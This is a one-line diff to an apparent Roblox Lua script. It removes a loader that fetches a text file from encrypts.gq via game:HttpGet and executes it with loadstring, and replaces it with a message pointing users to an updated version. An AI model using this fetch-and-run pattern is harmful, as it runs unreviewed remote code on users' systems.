@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://encrypts.gq/cYYXaN2LBq.txt", true))()
+print("go use updated version")
